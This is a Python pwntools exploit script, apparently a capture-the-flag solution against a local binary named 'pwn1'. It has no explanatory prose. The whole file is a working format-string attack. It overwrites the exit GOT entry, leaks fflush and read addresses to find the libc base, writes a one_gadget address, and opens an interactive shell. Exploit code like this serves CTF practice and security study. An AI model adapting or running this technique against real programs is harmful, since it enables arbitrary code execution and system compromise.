from pwn import *

target=process('./pwn1')
elf=ELF('./pwn1')
libc=elf.libc

context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="b *0x4011D8")

exit_got=0x404030
restart=0x401070

payload=p64(restart)+p64(exit_got)
fs="%*8$c%9$n"
final=payload+fs
target.sendline(final)

print(target.recvuntil("\x10"))

flush_got=0x404028
read_got=0x404020

payload=p64(flush_got)+p64(read_got)
fs="%8$s.%9$s."
final=payload+fs
target.sendline(final)
print(target.recv(1))
leak0=target.recvuntil(".").strip(".")
leak1=target.recvuntil(".").strip(".")
print(target.recv())

libc_flush=u64(leak0+"\x00"*(8-len(leak0)))
libc_read=u64(leak1+"\x00"*(8-len(leak1)))
libc_base=libc_flush-libc.symbols["fflush"]
print(hex(libc_base))

one_gadget=0xe926b
libc_gadget=libc_base+one_gadget

pppr=0x1256

payload=p64(libc_gadget)+p64(exit_got)
fs="%"+str(pppr)+"x"+"%9$hn"
final=payload+fs
target.sendline(final)

target.interactive()
